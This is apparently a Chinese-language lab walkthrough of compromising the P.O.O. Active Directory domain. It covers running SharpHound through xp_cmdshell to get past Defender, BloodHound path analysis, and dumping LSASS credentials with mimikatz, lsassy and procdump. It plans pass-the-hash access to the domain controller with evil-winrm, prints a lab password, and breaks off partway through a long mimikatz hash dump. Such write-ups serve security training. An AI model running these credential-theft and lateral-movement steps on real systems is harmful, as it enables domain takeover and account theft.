                                 [03]: dead:beef::1001
                           [02]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet1 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.20.128.101
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

该服务器是Windows Server 2019

Domain: intranet.poo

## Sharphound
鉴于这是一个活动目录环境( Active Directory，AD  )，而且我们需要进行迁移，所以可以运行 Bloodhound。

```c
upload ../../tools/sharphound/SharpHound-v2.5.7/SharpHound.ps1 SharpHound.ps1
```

```c
Set-ExecutionPolicy Bypass -Scope Process -Force
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain intranet.poo -ZipFileName loot.zip
```

📌 注意：

+ `-Scope Process`：只影响当前 WinRM 会话
+ 不会留下持久痕迹
+ 不需要“关安全软件”

### 最终定性结论
**SharpHound 被 Windows Defender 的 ASR（Attack Surface Reduction）规则在“行为层”拦截了**

不是加载  
不是解析  
不是脚本内容

而是——  
👉 **一旦它开始做 AD 枚举行为，就被杀**

### 解决方案
#### ✅ 换用户 ≠ 随便换
**换成「普通域成员用户 + 普通域成员主机」才会好**

你现在的组合是：

+ 👤 **Administrator（域管）**
+ 🖥️ **DC / 高防护主机**
+ 🛡️ **ASR + Defender + 行为监控拉满**

👉 这是 **SharpHound 最不可能成功** 的运行环境

#### 🔍 为什么“换用户”有用？
BloodHound / SharpHound 的**威胁模型**是：

“一个普通域用户，在一台普通域成员机器上，悄悄枚举 AD”

而不是：

“域管在 DC 上疯狂枚举整个森林”

在你现在的环境里，微软的逻辑是：

+ 域管 ≠ 不可信
+ **但域管在 DC 上跑攻击型枚举工具 = 高危**

所以结果就是你看到的那种：

+ 不报错
+ 不生成文件
+ 像是“没执行”

#### mssql尝试
```c
xp_cmdshell "powershell -ep bypass -c Import-Module C:\Users\Public\Downloads\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -Domain intranet.poo -ZipFileName loot.zip -OutputDirectory C:\Users\Public\Downloads"
```

```c
SQL (god  dbo@master)> xp_cmdshell "powershell -ep bypass -c Import-Module C:\Users\Public\Downloads\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -Domain intranet.poo -ZipFileName loot.zip -OutputDirectory C:\Users\Public\Downloads"

output                                                                             
--------------------------------------------------------------------------------   
2026-02-03T15:04:05.8818532+02:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound   
2026-02-03T15:04:06.1006318+02:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices   
2026-02-03T15:04:06.1318907+02:00|INFORMATION|Initializing SharpHound at 3:04 PM on 2/3/2026   
2026-02-03T15:04:18.3349020+02:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices   
2026-02-03T15:04:18.4442778+02:00|INFORMATION|Beginning LDAP search for intranet.poo   
2026-02-03T15:04:18.6161604+02:00|INFORMATION|Beginning LDAP search for intranet.poo Configuration NC   
2026-02-03T15:04:18.6475112+02:00|INFORMATION|Producer has finished, closing LDAP channel   
2026-02-03T15:04:18.6475112+02:00|INFORMATION|LDAP channel closed, waiting for consumers   
2026-02-03T15:04:31.6004708+02:00|INFORMATION|Consumers finished, closing output channel   
Closing writers                                                                    
2026-02-03T15:04:31.6160875+02:00|INFORMATION|Output channel closed, waiting for output task to complete   
2026-02-03T15:04:31.7410740+02:00|INFORMATION|Status: 310 objects finished (+310 23.84615)/s -- Using 134 MB RAM   
2026-02-03T15:04:31.7410740+02:00|INFORMATION|Enumeration finished in 00:00:13.3184345   
2026-02-03T15:04:31.8504573+02:00|INFORMATION|Saving cache with stats: 18 ID to type mappings.   
 1 name to SID mappings.                                                           
 2 machine sid mappings.                                                           
 4 sid to domain mappings.                                                         
 1 global catalog mappings.                                                        
2026-02-03T15:04:31.8818373+02:00|INFORMATION|SharpHound Enumeration Completed at 3:04 PM on 2/3/2026! Happy Graphing!   
NULL                                                                               
SQL (god  dbo@master)> 
SQL (god  dbo@master)> xp_cmdshell "dir C:\Users\Public\Downloads"
output                                                                             
--------------------------------------------------------------------------------   
 Volume in drive C has no label.                                                   
 Volume Serial Number is C675-9954                                                 
NULL                                                                               
 Directory of C:\Users\Public\Downloads                                            
NULL                                                                               
02/03/2026  03:04 PM    <DIR>          .                                           
02/03/2026  03:04 PM    <DIR>          ..                                          
02/03/2026  03:04 PM            26,426 20260203150419_loot.zip                     
12/12/2019  05:20 PM         1,397,304 chrome.exe                                  
02/03/2026  03:04 PM             1,732 OTM1MzQ0ZGMtYjQyMS00OTQyLWEzMDYtZDVlNzVmNzkwNWVm.bin   
02/03/2026  02:41 PM         2,328,064 SharpHound.exe                              
02/03/2026  02:46 PM         1,941,273 SharpHound.ps1                              
               5 File(s)      5,694,799 bytes                                      
               2 Dir(s)   6,611,763,200 bytes free                                 
NULL 
```

```c
*Evil-WinRM* PS C:\Users\Public\Downloads> download 20260203150419_loot.zip
                                        
Info: Downloading C:\Users\Public\Downloads\20260203150419_loot.zip to 20260203150419_loot.zip                        
                                        
Info: Download successful!
```

## Bloodhound
我们目前拿到了ADMINISTRATOR@INTRANET.POO用户

```c
whoami
→ compatibility\administrator
SID …-500
```

这是**本机 SAM 里的内置管理员**，不是：

+ `INTRANET\Administrator`
+ 也不是任何域用户

👉 **本地管理员 ≠ 域管理员**  
👉 对 DC 来说，你只是“一台普通域成员机上的本地账户”

![](/image/prolabs/P.O.O-7.png)

```c
COMPATIBILITY.INTRANET.POO
   └─ HasSession
        → P00_ADM@INTRANET.POO
              └─ MemberOf
                   → DOMAIN ADMINS@INTRANET.POO
                         └─ GenericAll / WriteDacl / Owns / GenericWrite
                               → ADMINISTRATOR@INTRANET.POO
```

### <font style="color:rgb(13, 13, 13);">🧠</font><font style="color:rgb(13, 13, 13);"> 第一步：</font>`<font style="background-color:rgb(236, 236, 236);">HasSession</font>`
**<font style="color:rgb(13, 13, 13);">COMPATIBILITY 这台机器上，当前有 P00_ADM 登录过  
</font>****<font style="color:rgb(13, 13, 13);">而 P00_ADM 是 Domain Admin  
</font>****<font style="color:rgb(13, 13, 13);">Domain Admin 对 Administrator 拥有完全控制权</font>**

```c
COMPATIBILITY → HasSession → P00_ADM
```

#### <font style="color:rgb(13, 13, 13);">🔥</font><font style="color:rgb(13, 13, 13);"> 为什么 HasSession 很值钱？</font>
<font style="color:rgb(13, 13, 13);">因为这意味着：</font>

**如果你控制了 COMPATIBILITY  
****你就有机会“偷到” P00_ADM 的凭据**

<font style="color:rgb(13, 13, 13);">方式包括：</font>

+ <font style="color:rgb(13, 13, 13);">LSASS dump</font>
+ <font style="color:rgb(13, 13, 13);">token stealing</font>
+ <font style="color:rgb(13, 13, 13);">mimikatz</font>

### <font style="color:rgb(13, 13, 13);">🧠</font><font style="color:rgb(13, 13, 13);"> 第二步：</font>`<font style="background-color:rgb(236, 236, 236);">P00_ADM@INTRANET.POO</font>`<font style="color:rgb(13, 13, 13);"> 是谁？</font>
<font style="color:rgb(13, 13, 13);">你贴的 Node 信息我直接给你翻译重点 </font><font style="color:rgb(13, 13, 13);">👇</font>

#### <font style="color:rgb(13, 13, 13);">1️⃣</font><font style="color:rgb(13, 13, 13);"> Tier Zero: </font>TRUE
<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">域顶级权限</font>**

#### <font style="color:rgb(13, 13, 13);">2️⃣</font><font style="color:rgb(13, 13, 13);"> Admin Count: </font>TRUE
<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> 受 AdminSDHolder 保护</font>

#### <font style="color:rgb(13, 13, 13);">3️⃣</font><font style="color:rgb(13, 13, 13);"> MemberOf:</font>
+ **<font style="color:rgb(13, 13, 13);">DOMAIN ADMINS</font>**
+ <font style="color:rgb(13, 13, 13);">（基本等于：域已经没秘密了）</font>

<font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">一句话</font>**<font style="color:rgb(13, 13, 13);">：</font>

**P00_ADM 本身就是域管理员**

# 提权
## <font style="color:rgb(13, 13, 13);">目标</font>
> ### <font style="color:rgb(13, 13, 13);">① BloodHound 结论</font>
> **P00_ADM 曾在 COMPATIBILITY 登录**
>
> ### <font style="color:rgb(13, 13, 13);">② 攻击思路</font>
> **在 COMPATIBILITY 上 dump P00_ADM 凭据**
>
> ### <font style="color:rgb(13, 13, 13);">③ 成功结果</font>
> **拿到 Domain Admin**
>

## <font style="color:rgb(13, 13, 13);">工具路线</font>
<font style="color:rgb(13, 13, 13);">接下来会用到的工具 </font>**<font style="color:rgb(13, 13, 13);">只有 3 类</font>**<font style="color:rgb(13, 13, 13);">：</font>

| **<font style="color:rgb(13, 13, 13);">阶段</font>** | **<font style="color:rgb(13, 13, 13);">工具</font>** | **<font style="color:rgb(13, 13, 13);">干嘛</font>** |
| --- | --- | --- |
| <font style="color:rgb(13, 13, 13);">1️⃣</font><font style="color:rgb(13, 13, 13);"> 枚举</font> | `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">query user / klist</font>**` | <font style="color:rgb(13, 13, 13);">确认 P00_ADM 是否真的在</font> |
| <font style="color:rgb(13, 13, 13);">2️⃣</font><font style="color:rgb(13, 13, 13);"> 抓凭据</font> | `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">mimikatz</font>**`<br/><font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">/</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">lsassy</font>**`<br/><font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">/</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">procdump</font>**` | <font style="color:rgb(13, 13, 13);">从内存偷</font> |
| <font style="color:rgb(13, 13, 13);">3️⃣</font><font style="color:rgb(13, 13, 13);"> 利用</font> | `**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">evil-winrm</font>**`<br/><font style="color:rgb(13, 13, 13);"> </font><font style="color:rgb(13, 13, 13);">/</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">impacket</font>**` | <font style="color:rgb(13, 13, 13);">用 DA 登录 DC</font> |


### <font style="color:rgb(13, 13, 13);">✅</font><font style="color:rgb(13, 13, 13);"> 第 1 步：确认 P00_ADM 是否真的“在这台机器上”</font>
<font style="color:rgb(13, 13, 13);">你现在在</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">COMPATIBILITY</font>**`<font style="color:rgb(13, 13, 13);">，先做</font>**<font style="color:rgb(13, 13, 13);">验证型操作</font>**<font style="color:rgb(13, 13, 13);">。</font>

#### <font style="color:rgb(13, 13, 13);">① 看当前登录用户</font>
```plain
query user
```

<font style="color:rgb(13, 13, 13);">如果你看到类似：</font>

```plain
P00_ADM    console   Active
```

<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">直接起飞</font>**

---

#### <font style="color:rgb(13, 13, 13);">② 看 Kerberos 票据（非常关键）</font>
```plain
klist
```

<font style="color:rgb(13, 13, 13);">如果你看到：</font>

```plain
INTRANET.POO\P00_ADM
```

<font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">BloodHound 的 HasSession 被你实锤了</font>**

---

### <font style="color:rgb(13, 13, 13);">✅</font><font style="color:rgb(13, 13, 13);"> 第 2 步：抓凭据（核心）</font>
<font style="color:rgb(13, 13, 13);">你现在是：</font>

+ <font style="color:rgb(13, 13, 13);">本地 Administrator</font>
+ <font style="color:rgb(13, 13, 13);">High Integrity</font>
+ <font style="color:rgb(13, 13, 13);">有</font><font style="color:rgb(13, 13, 13);"> </font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">SeDebugPrivilege</font>**`

<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">= 能读 LSASS</font>**

---

#### <font style="color:rgb(13, 13, 13);">🥇</font><font style="color:rgb(13, 13, 13);"> 首选方案（HTB 最稳）：lsassy（推荐）</font>
##### <font style="color:rgb(13, 13, 13);">Kali 上执行：</font>
```plain
lsassy -d intranet.poo -u Administrator -p '<你当前密码>' <COMPATIBILITY_IP>
```

<font style="color:rgb(13, 13, 13);">成功的话你会看到：</font>

```plain
Username: P00_ADM
Password: ********
```

<font style="color:rgb(13, 13, 13);">📌</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">这是最爽的一种</font>**

---

#### <font style="color:rgb(13, 13, 13);">🥈</font><font style="color:rgb(13, 13, 13);"> 备选方案：mimikatz（经典必会）</font>
##### <font style="color:rgb(13, 13, 13);">① 传 mimikatz</font>
```plain
upload mimikatz.exe
```

##### <font style="color:rgb(13, 13, 13);">② 执行</font>
```plain
.\mimikatz.exe
```

##### <font style="color:rgb(13, 13, 13);">③ 在 mimikatz 里敲：</font>
```plain
privilege::debug
sekurlsa::logonpasswords
```

<font style="color:rgb(13, 13, 13);">如果看到：</font>

```plain
Username : P00_ADM
NTLM     : xxxxxxxxxxxxxxxxx
```

<font style="color:rgb(13, 13, 13);">👉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">记下来</font>**

---

#### <font style="color:rgb(13, 13, 13);">🥉</font><font style="color:rgb(13, 13, 13);"> 再兜底：procdump + 离线分析</font>
##### <font style="color:rgb(13, 13, 13);">① dump lsass</font>
```plain
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

##### <font style="color:rgb(13, 13, 13);">② 拉回 Kali</font>
```plain
impacket-secretsdump -lsass lsass.dmp LOCAL
```

---

### <font style="color:rgb(13, 13, 13);">✅</font><font style="color:rgb(13, 13, 13);"> 第 3 步：用抓到的 DA 凭据打 DC</font>
<font style="color:rgb(13, 13, 13);">假设你现在拿到了：</font>

+ <font style="color:rgb(13, 13, 13);">用户：</font>`**<font style="color:rgb(13, 13, 13);background-color:rgb(236, 236, 236);">P00_ADM</font>**`
+ <font style="color:rgb(13, 13, 13);">密码 或 NTLM</font>

---

#### <font style="color:rgb(13, 13, 13);">方法 1：evil-winrm</font>
```plain
evil-winrm -i <DC_IP> -u P00_ADM -p '<password>' -d intranet.poo
```

---

#### <font style="color:rgb(13, 13, 13);">方法 2：Pass-the-Hash</font>
```plain
evil-winrm -i <DC_IP> -u P00_ADM -H <NTLM> -d intranet.poo
```

---

#### <font style="color:rgb(13, 13, 13);">验证你已经通关：</font>
```plain
whoami
hostname
```

<font style="color:rgb(13, 13, 13);">你应该看到：</font>

```plain
intranet\p00_adm
DC
```

<font style="color:rgb(13, 13, 13);">🎉</font><font style="color:rgb(13, 13, 13);"> </font>**<font style="color:rgb(13, 13, 13);">域已沦陷</font>**

## <font style="color:rgb(13, 13, 13);">实施</font>
```plain
*Evil-WinRM* PS C:\Users\Administrator\Documents> query user
query.exe : No User exists for *
    + CategoryInfo          : NotSpecified: (No User exists for *:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
*Evil-WinRM* PS C:\Users\Administrator\Documents> klist

Current LogonId is 0:0x1ae296c
Error calling API LsaCallAuthenticationPackage (ShowTickets substatus): 1312

klist failed with 0xc000005f/-1073741729

*Evil-WinRM* PS C:\Users\Administrator\Documents> upload ../../tools/mimikatz/x64/mimikatz.exe                                       
Info: Uploading /home/kali/Desktop/htb/poo/../../tools/mimikatz/x64/mimikatz.exe to C:\Users\Administrator\Documents\mimikatz.exe                                                                     
Data: 1807016 bytes of 1807016 bytes copied
Info: Upload successful!
```

```plain
┌──(kali㉿kali)-[~/Desktop/htb/poo]
└─$ evil-winrm -i poo.local -u Administrator -p EverybodyWantsToWorkAtP.O.O.
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                 
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
 

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 395837 (00000000:00060a3d)
Session           : Interactive from 0
User Name         : POO_PUBLIC16
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1018
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC16
         * Domain   : COMPATIBILITY
         * NTLM     : bf9d2e47676eec558780341f7321362c
         * SHA1     : fd0495e548189a3538e22be84a53993f2a2c2cca
         * DPAPI    : fd0495e548189a3538e22be84a53993f
        tspkg :
        wdigest :
         * Username : POO_PUBLIC16
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC16
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 395184 (00000000:000607b0)
Session           : Interactive from 0
User Name         : POO_PUBLIC13
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1015
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC13
         * Domain   : COMPATIBILITY
         * NTLM     : 6f593e0259a23d502368a934c090859d
         * SHA1     : 7e524d8973fd49e94a64d37d1a6dabb4399a13b0
         * DPAPI    : 7e524d8973fd49e94a64d37d1a6dabb4
        tspkg :
        wdigest :
         * Username : POO_PUBLIC13
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC13
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 394757 (00000000:00060605)
Session           : Interactive from 0
User Name         : POO_PUBLIC11
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1013
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC11
         * Domain   : COMPATIBILITY
         * NTLM     : 4f9400995fe130519c17f628d4ede212
         * SHA1     : e866560a8d592d63162223c0104dd13bb944867c
         * DPAPI    : e866560a8d592d63162223c0104dd13b
        tspkg :
        wdigest :
         * Username : POO_PUBLIC11
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC11
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 393789 (00000000:0006023d)
Session           : Interactive from 0
User Name         : POO_PUBLIC07
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1009
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC07
         * Domain   : COMPATIBILITY
         * NTLM     : 9b9c11a445e2aea545f8938ac09b1922
         * SHA1     : 7d5db57157c3deedfbb742f8eace643e47a72b96
         * DPAPI    : 7d5db57157c3deedfbb742f8eace643e
        tspkg :
        wdigest :
         * Username : POO_PUBLIC07
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC07
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 393371 (00000000:0006009b)
Session           : Interactive from 0
User Name         : POO_PUBLIC05
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1007
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC05
         * Domain   : COMPATIBILITY
         * NTLM     : a5870e78fc723b557c714ab7f1bcadd2
         * SHA1     : 783ca66b10d7f0b620814767548fac4beb5bb1da
         * DPAPI    : 783ca66b10d7f0b620814767548fac4b
        tspkg :
        wdigest :
         * Username : POO_PUBLIC05
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC05
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 392667 (00000000:0005fddb)
Session           : Interactive from 0
User Name         : POO_PUBLIC02
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1004
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC02
         * Domain   : COMPATIBILITY
         * NTLM     : 7e234179207ba2f0aac8ef8097763689
         * SHA1     : ae232d17e3464f6f493cd867ef48fc221a3a95e5
         * DPAPI    : ae232d17e3464f6f493cd867ef48fc22
        tspkg :
        wdigest :
         * Username : POO_PUBLIC02
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC02
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 392424 (00000000:0005fce8)
Session           : Interactive from 0
User Name         : POO_PUBLIC01
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1003
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC01
         * Domain   : COMPATIBILITY
         * NTLM     : 690c61db0425d35b3a1cc6cd9a7c6e9b
         * SHA1     : 49562f8cce2505a892523ea015dab78697733035
         * DPAPI    : 49562f8cce2505a892523ea015dab786
        tspkg :
        wdigest :
         * Username : POO_PUBLIC01
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC01
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 47014 (00000000:0000b7a6)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/3/2026 5:04:10 AM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : COMPATIBILITY$
         * Domain   : POO
         * NTLM     : 1ed3df9447eeea48ece1b3ade007d246
         * SHA1     : 0d384ea0c578466cbc7c685a3399ea2e840de35e
         * DPAPI    : 0d384ea0c578466cbc7c685a3399ea2e
        tspkg :
        wdigest :
         * Username : COMPATIBILITY$
         * Domain   : POO
         * Password : (null)
        kerberos :
         * Username : COMPATIBILITY$
         * Domain   : intranet.poo
         * Password : 75 b6 2f 35 b5 ce b3 14 6f 29 e2 9f 1a 9e 80 77 f1 fd e0 86 9b 99 8f ab a8 1b 25 cf e5 6e 18 1f 54 c6 d9 8e 3a 4e 0c 32 88 56 e5 81 ce a7 5c 6e 9b 42 f5 af 3d 38 35 e9 14 b5 df 36 bb 4d 4f 0c 93 9c 56 12 ea 2e d3 0e 74 b8 7a 9e 34 bb 80 da f4 52 f1 45 ea 16 55 fb db 14 86 ae 44 0a da bd ba 44 4d 65 fa ee 26 69 4f 72 0d ef 48 42 aa b9 32 b6 6f d9 15 1a 24 00 0f 52 c8 a1 ea 31 18 48 9c 27 17 dc f6 58 43 78 a2 2e 53 04 e3 9e 4d ed 67 40 95 0e eb 4d 61 15 da e0 db ca b8 27 fa 43 a8 fc fe c0 a1 cf f3 e6 cb ae a2 3b 92 25 b7 91 d5 a8 4d fc 6f 41 2a 0f 7c d4 27 5f 09 d3 1e e8 2e 6b bb 49 41 bf 96 dc 6d 05 2d 80 85 75 a3 28 8a 0d 03 62 7f 83 65 e8 88 f7 a6 b8 49 4c 5a 84 25 22 11 32 2c 41 02 04 98 e0 91 bb b2 4b 4a ab
        ssp :
        credman :

Authentication Id : 0 ; 396524 (00000000:00060cec)
Session           : Interactive from 0
User Name         : POO_PUBLIC19
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1021
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC19
         * Domain   : COMPATIBILITY
         * NTLM     : aa982b8ea00487831241cba3a6cd8a2d
         * SHA1     : 7994d59b1f45ca132055929baf95f5ed28ad6369
         * DPAPI    : 7994d59b1f45ca132055929baf95f5ed
        tspkg :
        wdigest :
         * Username : POO_PUBLIC19
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC19
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 396065 (00000000:00060b21)
Session           : Interactive from 0
User Name         : POO_PUBLIC17
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1019
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC17
         * Domain   : COMPATIBILITY
         * NTLM     : 4696122ebd0587fa8686876167f3ca2f
         * SHA1     : bc83f806759380217fde3baa4ff593314913eba3
         * DPAPI    : bc83f806759380217fde3baa4ff59331
        tspkg :
        wdigest :
         * Username : POO_PUBLIC17
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC17
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 392907 (00000000:0005fecb)
Session           : Interactive from 0
User Name         : POO_PUBLIC03
Domain            : COMPATIBILITY
Logon Server      : COMPATIBILITY
Logon Time        : 2/3/2026 5:04:44 AM
SID               : S-1-5-21-158512341-328150952-995267585-1005
        msv :
         [00000003] Primary
         * Username : POO_PUBLIC03
         * Domain   : COMPATIBILITY
         * NTLM     : 9f60b98abc6b26428a7189b15ab130d0
         * SHA1     : 3e8aa7723b52ef4bb361df115f17edde24ea8f8e
         * DPAPI    : 3e8aa7723b52ef4bb361df115f17edde
        tspkg :
        wdigest :
         * Username : POO_PUBLIC03
         * Domain   : COMPATIBILITY
         * Password : (null)
        kerberos :
         * Username : POO_PUBLIC03
         * Domain   : COMPATIBILITY
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 355521 (00000000:00056cc1)
Session           : Service from 0
User Name         : MSSQLLaunchpad$POO_PUBLIC
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2/3/2026 5:04:39 AM
SID               : S-1-5-80-2923982856-956738206-3631510513-657584954-3978543124
        msv :
         [00000003] Primary
         * Username : COMPATIBILITY$
         * Domain   : POO
         * NTLM     : 1ed3df9447eeea48ece1b3ade007d246
         * SHA1     : 0d384ea0c578466cbc7c685a3399ea2e840de35e
         * DPAPI    : 0d384ea0c578466cbc7c685a3399ea2e
        tspkg :
        wdigest :
         * Username : COMPATIBILITY$
         * Domain   : POO
         * Password : (null)
        kerberos :
         * Username : COMPATIBILITY$
         * Domain   : intranet.poo
         * Password : 75 b6 2f 35 b5 ce b3 14 6f 29 e2 9f 1a 9e 80 77 f1 fd e0 86 9b 99 8f ab a8 1b 25 cf e5 6e 18 1f 54 c6 d9 8e 3a 4e 0c 32 88 56 e5 81 ce a7 5c 6e 9b 42 f5 af 3d 38 35 e9 14 b5 df 36 bb 4d 4f 0c 93 9c 56 12 ea 2e d3 0e 74 b8 7a 9e 34 bb 80 da f4 52 f1 45 ea 16 55 fb db 14 86 ae 44 0a da bd ba 44 4d 65 fa ee 26 69 4f 72 0d ef 48 42 aa b9 32 b6 6f d9 15 1a 24 00 0f 52 c8 a1 ea 31 18 48 9c 27 17 dc f6 58 43 78 a2 2e 53 04 e3 9e 4d ed 67 40 95 0e eb 4d 61 15 da e0 db ca b8 27 fa 43 a8 fc fe c0 a1 cf f3 e6 cb ae a2 3b 92 25 b7 91 d5 a8 4d fc 6f 41 2a 0f 7c d4 27 5f 09 d3 1e e8 2e 6b bb 49 41 bf 96 dc 6d 05 2d 80 85 75 a3 28 8a 0d 03 62 7f 83 65 e8 88 f7 a6 b8 49 4c 5a 84 25 22 11 32 2c 41 02 04 98 e0 91 bb b2 4b 4a ab
        ssp :
        credman :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2/3/2026 5:04:14 AM
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 125619 (00000000:0001eab3)
Session           : Service from 0
User Name         : SQLTELEMETRY$POO_CONFIG
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2/3/2026 5:04:12 AM
SID               : S-1-5-80-967927545-2844676816-280006584-3260051767-4043001905
        msv :
         [00000003] Primary
